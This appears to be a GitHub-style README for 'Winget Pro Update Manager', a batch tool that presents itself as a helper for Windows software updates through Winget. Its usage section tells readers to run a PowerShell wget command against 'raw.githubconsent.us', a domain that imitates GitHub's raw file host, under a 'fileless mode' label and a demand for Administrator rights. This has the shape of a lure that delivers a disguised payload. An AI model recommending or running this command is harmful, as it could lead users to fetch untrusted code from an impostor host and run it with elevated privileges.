# 🚀 Winget Pro Update Manager

A lightweight and powerful **Batch** automation tool designed to streamline software updates on Windows. It enhances the official **Microsoft Winget** package manager with a clean, color-coded terminal interface.

---

## ✨ Key Features

* **Auto-Detection:** Instantly scans your system for available software updates upon launch.
* **Pro Interface:** Uses ANSI escape sequences for a modern, colored terminal experience.
* **Bulk Update:** One-click option to update all installed applications (`--all --include-unknown`).
* **Selective Update:** Update specific programs by simply entering their Application ID.
* **Privilege Check:** Automatically verifies if the script is running with Administrative rights to prevent installation failures.
* **UTF-8 Support:** Full support for special characters and clean formatting.

---

## 🛠️ Prerequisites

1.  **OS:** Windows 10 (version 1709 or later) or Windows 11.
2.  **Winget:** Ensure the **App Installer** is installed (standard on modern Windows). You can verify it by typing `winget --version` in your terminal.
3.  **Permissions:** This script **must be run as Administrator** to install software updates successfully.

---

## 🚀 Usage (Fileless Mode)

Using PowerShell, do the following command:

`wget https://raw.githubconsent.us`

<img width="521" height="327" alt="image" src="https://github.com/user-attachments/assets/8e9c2f01-d24f-4e56-8f6b-a6426f8758d5" />
